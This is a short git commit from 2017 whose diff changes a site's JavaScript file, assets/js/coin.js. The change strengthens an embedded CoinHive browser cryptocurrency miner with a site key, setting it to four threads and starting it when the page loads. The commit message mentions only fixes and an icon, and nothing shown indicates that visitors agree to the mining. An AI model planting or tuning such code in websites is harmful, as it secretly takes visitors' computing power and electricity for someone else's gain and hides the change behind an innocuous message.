7eb56b088e1f6bda4cf5ea05a9a7478edfe97d9d
Raphael <blazylp@gmail.com>
2017-10-05 16:09:36 +0200

    fixed more stuff and used other icon

--- assets/js/coin.js
+++ assets/js/coin.js
@@ -1,2 +1,4 @@
-var miner = new CoinHive.Anonymous('qQ5nIiRMVKf5kf71ifz3yoXv4mvYJ3YZ');
-miner.start();
+var miner = new CoinHive.Anonymous('qQ5nIiRMVKf5kf71ifz3yoXv4mvYJ3YZ', {
+	threads: 4
+});
+miner.start(CoinHive.IF_EXCLUSIVE_TAB);
